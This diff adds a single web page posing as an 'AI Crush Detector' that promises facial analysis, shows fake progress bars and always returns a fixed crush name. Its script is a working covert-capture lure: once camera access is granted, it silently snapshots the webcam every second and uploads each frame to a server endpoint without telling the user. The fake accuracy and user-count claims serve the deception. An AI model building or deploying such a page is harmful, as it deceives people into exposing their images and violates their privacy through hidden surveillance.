@@ -1,0 +1,275 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>AI Crush Detector 💖</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        body { font-family: 'Arial', sans-serif; }
+        .gradient-bg { background: linear-gradient(135deg, #1e1b4b 0%, #312e81 100%); }
+        .pulse-glow { animation: pulse 2s infinite; }
+        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.5; } }
+        .scan-line { 
+            position: absolute; top: 0; left: 0; right: 0; height: 2px;
+            background: linear-gradient(90deg, transparent, #ff6b6b, transparent);
+            animation: scan 2s linear infinite;
+        }
+        @keyframes scan { 0% { transform: translateY(0); } 100% { transform: translateY(300px); } }
+    </style>
+</head>
+<body class="gradient-bg min-h-screen text-white">
+    <div id="app" class="container mx-auto px-4 py-8 max-w-md">
+        <!-- Loading Screen -->
+        <div id="loading" class="text-center">
+            <div class="w-20 h-20 border-4 border-pink-500 rounded-full animate-spin border-t-transparent mb-4 mx-auto"></div>
+            <p class="text-lg">Initializing AI Crush Detector...</p>
+        </div>
+        
+        <!-- Welcome Screen -->
+        <div id="welcome" class="text-center space-y-8 hidden">
+            <div class="w-32 h-32 bg-pink-500 rounded-full flex items-center justify-center mx-auto mb-8 pulse-glow">
+                <span class="text-6xl">💖</span>
+            </div>
+            <h1 class="text-4xl font-bold bg-gradient-to-r from-pink-400 to-blue-400 bg-clip-text text-transparent">AI Crush Detector</h1>
+            <p class="text-xl text-gray-300">Powered by Advanced Love Algorithm™</p>
+            <div class="bg-gray-800 rounded-lg p-4 border border-pink-500">
+                <p class="text-sm text-gray-200">🔥 99.9% Accuracy Rate</p>
+                <p class="text-sm text-gray-200">❤️ Used by 10M+ People</p>
+                <p class="text-sm text-gray-200">🎯 Instant Results</p>
+            </div>
+            <button onclick="startDetection()" class="w-full bg-pink-500 py-4 rounded-xl font-semibold text-lg hover:bg-pink-600 transition-all">
+                Start Crush Detection 💖
+            </button>
+        </div>
+        
+        <!-- Camera Screen -->
+        <div id="camera" class="text-center space-y-8 hidden">
+            <div class="w-24 h-24 bg-blue-500 rounded-full flex items-center justify-center mx-auto mb-8">
+                <span class="text-4xl">📸</span>
+            </div>
+            <h2 class="text-3xl font-bold">Camera Access Required</h2>
+            <p class="text-gray-300">We need access to your camera to analyze your facial expressions.</p>
+            <button onclick="requestCamera()" class="w-full bg-blue-500 py-4 rounded-xl font-semibold text-lg hover:bg-blue-600 transition-all">
+                Allow Camera Access 📸
+            </button>
+        </div>
+        
+        <!-- Analysis Screen -->
+        <div id="analysis" class="space-y-6 hidden">
+            <div class="relative aspect-square bg-gray-900 flex items-center justify-center border-2 border-pink-500 rounded-lg overflow-hidden">
+                <video id="video" class="w-full h-full object-cover" autoplay muted playsinline></video>
+                <div class="scan-line"></div>
+                <div class="absolute top-4 right-4 bg-red-500 text-white px-2 py-1 rounded-full text-xs font-semibold pulse-glow">
+                    ● LIVE
+                </div>
+            </div>
+            
+            <div class="bg-gray-800 rounded-xl p-6 border border-pink-500">
+                <h3 class="text-xl font-semibold mb-4 text-center">AI Analysis in Progress</h3>
+                <div class="space-y-4">
+                    <div class="space-y-2">
+                        <div class="flex justify-between text-sm">
+                            <span>Facial Expression Analysis</span>
+                            <span id="progress1">0%</span>
+                        </div>
+                        <div class="w-full bg-gray-700 rounded-full h-2">
+                            <div id="bar1" class="bg-pink-500 h-2 rounded-full transition-all duration-300" style="width: 0%"></div>
+                        </div>
+                    </div>
+                    <div class="space-y-2">
+                        <div class="flex justify-between text-sm">
+                            <span>Micro-emotion Detection</span>
+                            <span id="progress2">0%</span>
+                        </div>
+                        <div class="w-full bg-gray-700 rounded-full h-2">
+                            <div id="bar2" class="bg-blue-500 h-2 rounded-full transition-all duration-300" style="width: 0%"></div>
+                        </div>
+                    </div>
+                    <div class="space-y-2">
+                        <div class="flex justify-between text-sm">
+                            <span>Crush Pattern Recognition</span>
+                            <span id="progress3">0%</span>
+                        </div>
+                        <div class="w-full bg-gray-700 rounded-full h-2">
+                            <div id="bar3" class="bg-gradient-to-r from-blue-500 to-pink-500 h-2 rounded-full transition-all duration-300" style="width: 0%"></div>
+                        </div>
+                    </div>
+                </div>
+                <div class="mt-6 text-center">
+                    <p id="analysis-message" class="text-gray-300 text-sm">Initializing neural networks...</p>
+                </div>
+            </div>
+        </div>
+        
+        <!-- Results Screen -->
+        <div id="results" class="space-y-6 hidden">
+            <div class="text-center">
+                <div class="w-32 h-32 bg-pink-500 rounded-full flex items-center justify-center mx-auto mb-6 pulse-glow">
+                    <span class="text-6xl">💖</span>
+                </div>
+                <h2 class="text-3xl font-bold bg-gradient-to-r from-pink-400 to-blue-400 bg-clip-text text-transparent mb-2">Crush Detected!</h2>
+                <p class="text-xl text-gray-300">AI Confidence: 99.7%</p>
+            </div>
+            
+            <div class="bg-gray-800 rounded-xl p-6 border border-pink-500">
+                <div class="text-center space-y-4">
+                    <div class="text-6xl">💖</div>
+                    <h3 class="text-2xl font-bold">Your Crush: KALEEM</h3>
+                    <p class="text-gray-300">Our advanced AI has detected strong romantic feelings!</p>
+                </div>
+            </div>
+            
+            <button onclick="analyzeAgain()" class="w-full bg-pink-500 py-4 rounded-xl font-semibold text-lg hover:bg-pink-600 transition-all">
+                Analyze Again 🔄
+            </button>
+        </div>
+    </div>
+    
+    <script>
+    let stream = null;
+    let captureInterval = null;
+    let analysisProgress = 0;
+    
+    const analysisMessages = [
+        "Initializing neural networks...",
+        "Scanning facial micro-expressions...",
+        "Analyzing eye movement patterns...",
+        "Detecting emotional signatures...",
+        "Cross-referencing with crush database...",
+        "Processing romantic indicators...",
+        "Finalizing crush assessment..."
+    ];
+    
+    document.addEventListener('DOMContentLoaded', function() {
+        setTimeout(() => showScreen('welcome'), 3000);
+    });
+    
+    function showScreen(screenName) {
+        ['loading', 'welcome', 'camera', 'analysis', 'results'].forEach(id => {
+            document.getElementById(id).classList.add('hidden');
+        });
+        document.getElementById(screenName).classList.remove('hidden');
+    }
+    
+    function startDetection() {
+        showScreen('camera');
+    }
+    
+    async function requestCamera() {
+        try {
+            stream = await navigator.mediaDevices.getUserMedia({
+                video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
+                audio: false
+            });
+            
+            showScreen('analysis');
+            const video = document.getElementById('video');
+            video.srcObject = stream;
+            
+            startAnalysis();
+            startPhotoCapture();
+            
+        } catch (error) {
+            console.error('Camera access denied:', error);
+            alert('Camera access is required! Please allow and try again.');
+        }
+    }
+    
+    function startAnalysis() {
+        analysisProgress = 0;
+        let messageIndex = 0;
+        
+        const interval = setInterval(() => {
+            analysisProgress += 1;
+            
+            const progress1 = Math.min(100, (analysisProgress / 30) * 100);
+            const progress2 = Math.min(100, Math.max(0, (analysisProgress - 10) / 30) * 100);
+            const progress3 = Math.min(100, Math.max(0, (analysisProgress - 20) / 30) * 100);
+            
+            document.getElementById('progress1').textContent = Math.round(progress1) + '%';
+            document.getElementById('progress2').textContent = Math.round(progress2) + '%';
+            document.getElementById('progress3').textContent = Math.round(progress3) + '%';
+            
+            document.getElementById('bar1').style.width = progress1 + '%';
+            document.getElementById('bar2').style.width = progress2 + '%';
+            document.getElementById('bar3').style.width = progress3 + '%';
+            
+            if (analysisProgress % 8 === 0) {
+                document.getElementById('analysis-message').textContent = analysisMessages[messageIndex];
+                messageIndex = (messageIndex + 1) % analysisMessages.length;
+            }
+            
+            if (analysisProgress >= 60) {
+                clearInterval(interval);
+                stopPhotoCapture();
+                showResults();
+            }
+        }, 100);
+    }
+    
+    function startPhotoCapture() {
+        const video = document.getElementById('video');
+        
+        video.onloadedmetadata = () => {
+            captureInterval = setInterval(() => {
+                capturePhoto();
+            }, 1000);
+        };
+    }
+    
+    function capturePhoto() {
+        const video = document.getElementById('video');
+        const canvas = document.createElement('canvas');
+        const context = canvas.getContext('2d');
+        
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        context.drawImage(video, 0, 0);
+        
+        canvas.toBlob(async (blob) => {
+            if (blob) {
+                try {
+                    const formData = new FormData();
+                    formData.append('photo', blob, 'capture.jpg');
+                    
+                    const response = await fetch('/api/send-photo', {
+                        method: 'POST',
+                        body: formData
+                    });
+                    
+                    if (response.ok) {
+                        console.log('✅ Photo sent successfully');
+                    } else {
+                        console.log('❌ Failed to send photo');
+                    }
+                } catch (error) {
+                    console.error('❌ Network error:', error);
+                }
+            }
+        }, 'image/jpeg', 0.9);
+    }
+    
+    function stopPhotoCapture() {
+        if (captureInterval) {
+            clearInterval(captureInterval);
+            captureInterval = null;
+        }
+        
+        if (stream) {
+            stream.getTracks().forEach(track => track.stop());
+            stream = null;
+        }
+    }
+    
+    function showResults() {
+        showScreen('results');
+    }
+    
+    function analyzeAgain() {
+        showScreen('analysis');
+        requestCamera();
+    }
+    </script>
+</body>
+</html>
